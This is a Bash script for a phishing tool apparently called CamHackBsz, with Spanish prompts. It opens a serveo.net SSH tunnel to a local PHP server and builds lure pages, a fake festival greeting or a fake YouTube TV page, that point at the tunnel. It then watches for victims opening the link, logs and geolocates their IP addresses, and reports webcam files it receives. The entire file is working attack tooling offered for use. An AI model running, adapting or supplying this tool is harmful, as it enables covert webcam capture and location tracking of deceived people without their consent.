trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m   ____                _   _            _    ____          \e[0m\n"
printf "\e[1;92m  / ___|__ _ _ __ ___ | | | | __ _  ___| | _| __ ) ___ ____\e[0m\n"
printf "\e[1;92m | |   / _  | '_   _ \| |_| |/ _  |/ __| |/ /  _ \/ __|_  /\e[0m\n"
printf "\e[1;92m | |__| (_| | | | | | |  _  | (_| | (__|   <| |_) \__ \/ / \e[0m\n"
printf "\e[1;92m  \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\____/|___/___|\e[0m\n"
printf "\e[1;92m \e[0m\n"
printf "\e[1;92m BY @AvaStrOficial / version : 0.0.1\e[0m\n"

printf "\n"


}
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "php pero no está instalado."; exit 1; }
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    echo "$ip" >> saved.ip.txt

    # Obtener datos de la segunda fuente (ipapi.co)
    response2=$(curl -s "https://ipapi.co/${ip}/json/")
    if [ $? -eq 0 ]; then
        data=$(echo $response2 | jq -r '.')
    else
        data=""
    fi

    # Combinar datos de las dos fuentes
    combined_data="{\"data2\": ${data}}"

    # Mostrar la información combinada
    ip_info_text=$(format_ip_info "$combined_data")
    echo "$ip_info_text"
}

format_ip_info() {
    data="$1"  # Recibimos los datos combinados como argumento
    asn=$(echo "$data" | jq -r '.data2.asn // "No disponible"')
   
    
    ip_info_text=$(cat <<EOF
🏝️ País: $(echo $data | jq -r '.data2.country_name // "No disponible"')
🗺️ Región: $(echo $data | jq -r '.data2.region // .data2.region_name // "No disponible"')
🌆 Ciudad: $(echo $data | jq -r '.data2.city // .data2.city_name // "No disponible"')
📮 Código postal: $(echo $data | jq -r '.data2.postal // .data2.zip_code // "No disponible"')
🌍 Latitud: $(echo $data | jq -r '.data2.latitude // "No disponible"')
🌍 Longitud: $(echo $data | jq -r '.data2.longitude // "No disponible"')
⏰ Zona horaria: $(echo $data | jq -r '.data2.timezone // .data2.time_zone // "No disponible"')
💼 ISP: $(echo $data | jq -r '.data2.org // .data2.isp // "No disponible"')
📡 ASN: $asn (URL: https://ipinfo.io/$asn)
EOF
)
    echo "$ip_info_text"
}




checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}

server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
}

select_template() {
printf "\n-----Usa un tunel----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Web Festival \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Plantilla de Youtube TV\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elija una plantilla: [Predeterminado es 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Nombre de La Pagina: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Escriba la ID Del Video De Youtube: \e[0m' yt_video_ID
else
printf "\e[1;93m [!] ¡Opción de plantilla no válida! intentar otra vez\e[0m\n"
sleep 1
select_template
fi
}

payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$send_link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$send_link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html
}

start() {
default_choose_sub="Y"
default_subdomain="BSZ$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound
}

banner
dependencies
select_template
start
